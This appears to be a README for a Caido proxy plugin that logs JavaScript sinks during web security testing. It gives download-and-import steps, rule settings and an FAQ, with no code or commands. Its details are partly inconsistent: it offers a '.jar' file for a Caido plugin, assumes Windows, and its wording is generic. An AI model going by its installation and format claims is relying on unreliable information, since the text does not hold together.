# 🔍 domloggerpp-caido - Monitor and debug JavaScript sinks easily

[ ![Download Plugin](https://img.shields.io/badge/Download-Plugin-blue) ](https://github.com/Gmsher5817/domloggerpp-caido/releases)

## 📖 Overview

Domloggerpp-caido works within the Caido security testing tool. It watches how programs handle data in your web browser. Security researchers use this to track how information moves through a page. The plugin finds hidden JavaScript sinks. A sink is a function that performs an action with data. By finding these, you spot potential bugs in web applications. You can set custom rules to focus on parts of the code that interest you.

## 🛠 Prerequisites

You need the Caido software installed on your Windows computer before you start. The plugin relies on the Caido environment to function. Ensure you run the latest version of Caido. You need a stable internet connection to load the plugin features. No other software or coding knowledge is needed to use this tool.

## 📥 Installation Steps

1. Visit the [releases page](https://github.com/Gmsher5817/domloggerpp-caido/releases) to download the plugin file.
2. Look for the file ending in `.jar` or `.cplugin` inside the latest release.
3. Click the file name to start the download.
4. Save the file to your desktop or a folder you can find later.
5. Open your Caido application.
6. Navigate to the Plugin settings menu in Caido.
7. Click the button labeled Import Plugin or Add Plugin.
8. Select the file you downloaded.
9. Caido will load the plugin automatically.

## ⚙️ How to Use

Once you install the plugin, it appears in your Caido sidebar. Click the icon to open the main window. The interface shows a list of configuration rules. These rules tell the plugin what code paths to watch. 

The plugin monitors the document object model of the pages you visit. When it detects a sink, it records the event. You see these events in the log window. Each log entry shows the exact line of code that triggered the sink. You can pause or stop the logger at any time using the buttons at the top of the interface.

## 📋 Creating Custom Rules

You can limit the scope of the plugin by editing the configuration file. Open the Settings tab inside the plugin window. Here, you define patterns for the plugin to follow. You might want to track data sent to innerHTML or eval functions. Enter these keywords into the rule box. The plugin prioritizes your list. It ignores code patterns not mentioned in your configuration. This removes noise and helps you find useful information faster.

## 🚀 Troubleshooting

If the plugin does not show data, verify the connection between Caido and your browser. Ensure your proxy settings in Caido match your browser settings. Refresh the browser page to restart the traffic. Sometimes, your browser cache keeps old data. Clear your browser cache and try again. 

If you see an error message, check the log file in your Caido folder. This file records events from the plugin. If the plugin fails to load, verify you downloaded the latest version from the link above. Check that your Windows user account has permission to read files in the folder where you saved the plugin.

## 🛡 Security Privacy

All data remains local to your machine. The plugin processes everything inside your browser and the Caido tool. It does not send your data to any outside server. You stay in control of the information collected during your testing sessions. You may delete the log files manually at any time to clear your history.

## 💡 Frequently Asked Questions

**Does the plugin slow down my browsing?**
The plugin adds minor overhead. If you notice a slowdown, reduce the number of active rules in your configuration.

**Can I run this on macOS or Linux?**
The steps provided focus on Windows, but the plugin architecture allows it to run on any operating system that supports Caido.

**Where can I request new features?**
You can use the issues section on the project page to report bugs or suggest enhancements.

**Do I need to update the plugin often?**
Yes, updates improve performance and ensure compatibility with newer versions of Caido. Check the release page occasionally.

## 📂 Configuration Options

The application includes several ways to filter traffic:

*   **Sink types:** Select specific JavaScript functions to report.
*   **Domain filtering:** Only watch traffic from sites you define.
*   **Event archiving:** Save reports to your disk for later study.
*   **Clear Log:** One-click button to vanish old data.

Use these settings to match your workflow. Most users find success by starting with default rules and building out as needed. The plugin supports saving your custom configurations as files. You can export these files to move your settings to another computer. This saves time if you work across multiple machines. 

The software includes a help tab that explains what each configuration box does. Hover your mouse over the labels to reveal a brief tip. This keeps the interface clean while offering guidance to new users. Keep your rules list short to ensure the plugin stays quick. Large lists may consume more memory than necessary on older computers. Balance the number of sinks you monitor to get the best performance. Everything responds in real-time. You watch the logs update as you click through pages. This instant feedback loop allows for rapid experimentation with your web security tests.